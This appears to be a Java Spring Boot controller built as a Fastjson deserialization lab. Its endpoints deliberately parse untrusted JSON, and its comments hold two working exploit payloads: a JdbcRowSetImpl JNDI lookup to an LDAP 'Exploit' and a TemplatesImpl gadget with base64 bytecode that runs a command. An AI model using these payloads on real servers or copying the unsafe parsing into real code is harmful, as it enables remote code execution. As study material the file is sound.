package me.mole.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.util.IOUtils;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/fj1224")
public class FastjsonController {

    @GetMapping("/hello")
    public String hello() {
        return "Hello, SpringBoot!";
    }

    /**
     * String payload1 =
     *   "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8384/Exploit\",\"autoCommit\":true}";
     *
     * @param jsonStr
     * @return
     */
    @PostMapping(value = "/hackfastjson1")
    public String hackfastjson1(@RequestBody String jsonStr) {
        System.out.println("s===" + jsonStr);
        Object jsonObject = JSON.parse(jsonStr);
        return "ok";
    }

    /**
     * String payload2 =
     *   "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAKgoACQAaCgAbABwIAB0KABsAHgcAHwoABQAgBwAhCgAHABoHACIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAIQcAHwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQANRXhwbG9pdDIuamF2YQwACgALBwAkDAAlACYBABJvcGVuIC1hIENhbGN1bGF0b3IMACcAKAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACkACwEACEV4cGxvaXQyAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAkAAAAAAAQAAQAKAAsAAQAMAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgANAAAAGgAGAAAACAAEAAsADQARABAADwARABAAFQASAA4AAAAQAAL/ABAAAQcADwABBwAQBAABABEAEgACAAwAAAAZAAAAAwAAAAGxAAAAAQANAAAABgABAAAAGAATAAAABAABABQAAQARABUAAgAMAAAAGQAAAAQAAAABsQAAAAEADQAAAAYAAQAAAB0AEwAAAAQAAQAUAAkAFgAXAAEADAAAACUAAgACAAAACbsAB1m3AAhMsQAAAAEADQAAAAoAAgAAACAACAAhAAEAGAAAAAIAGQ==\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
     */
    @PostMapping(value = "/hackfastjson2")
    public String hackfastjson2(@RequestBody String jsonStr) {
        System.out.println("s===" + jsonStr);
        Object jsonObject = JSON.parse(jsonStr, Feature.SupportNonPublicField);
        return "ok";
    }
}